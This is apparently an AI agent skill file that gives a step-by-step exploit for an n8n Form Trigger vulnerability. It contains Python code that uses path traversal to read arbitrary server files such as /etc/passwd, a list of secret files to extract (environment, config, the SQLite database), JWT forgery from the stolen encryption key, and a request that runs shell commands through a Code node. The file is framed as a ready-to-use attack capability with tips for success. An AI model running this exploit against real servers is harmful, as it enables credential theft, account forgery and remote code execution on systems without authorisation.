---
name: n8n-form-trigger-rce
description: "Use when n8n workflow automation. File read + RCE."
---
# CVE-2026-21858 n8n Form Trigger Arbitrary File Read + RCE

## Overview
n8n <= 1.120.4. The Form Trigger node's file upload handler allows path traversal in the `filepath` field, reading arbitrary files from the server. Combined with extracted `ENCRYPTION_KEY` and admin credentials, achieves full RCE via code execution nodes.

## Detection
```bash
# n8n fingerprint
curl -s <TARGET>/healthz  # returns {"status":"ok"}
curl -s <TARGET>/rest/settings | grep '"n8nVersion"'
# Form trigger URLs: <TARGET>/form/<WORKFLOW_ID>
```

## Exploitation

### Step 1: Arbitrary file read via form trigger
```python
import requests

TARGET = '<TARGET>'
FORM_URL = f'{TARGET}/form/<WORKFLOW_ID>'  # Find via /rest/workflows

# Read /etc/passwd
r = requests.post(FORM_URL, json={
    'data': {},
    'files': {'file': {'filepath': '/etc/passwd', 'originalFilename': 'x.txt'}}
})
# Response contains formWaitingUrl — GET it to retrieve file content
waiting_url = r.json().get('formWaitingUrl')
import time; time.sleep(5)
content = requests.get(waiting_url).text
print(content)
```

### Step 2: Extract secrets
```python
# Read n8n config
for f in ['/home/n8n/.n8n/config', '/home/n8n/.n8n/.env',
          '/proc/self/environ', '/home/n8n/.n8n/database.sqlite']:
    # ... same file read technique
    pass
# Extract: N8N_ENCRYPTION_KEY, DB credentials, admin password hash
```

### Step 3: Forge JWT + RCE
```python
import jwt, hashlib

SECRET_KEY = '<EXTRACTED_KEY>'
admin_id = '<ADMIN_UUID>'
admin_hash = '<ADMIN_BCRYPT_HASH>'

# n8n JWT: {id: admin_id, hash: first10chars_of_bcrypt, email: admin_email}
token = jwt.encode(
    {'id': admin_id, 'hash': admin_hash[:10], 'email': 'admin@local'},
    SECRET_KEY, algorithm='HS256'
)

# Execute command via Code node
requests.post(f'{TARGET}/rest/workflows',
    headers={'Authorization': f'Bearer {token}'},
    json={'name':'pwn','nodes':[{'type':'n8n-nodes-base.code',
          'parameters':{'jsCode':'require("child_process").execSync("id").toString()'}}]})
```

## Pitfalls
- Form Trigger must be active (workflow enabled with form node)
- `formWaitingUrl` has a timeout — fetch quickly after POST
- n8n runs as `n8n` user (uid 1000), not root
- SQLite DB path varies: ~/.n8n/database.sqlite or /home/n8n/.n8n/
- Source: EQSTLab/CVE-2026-21858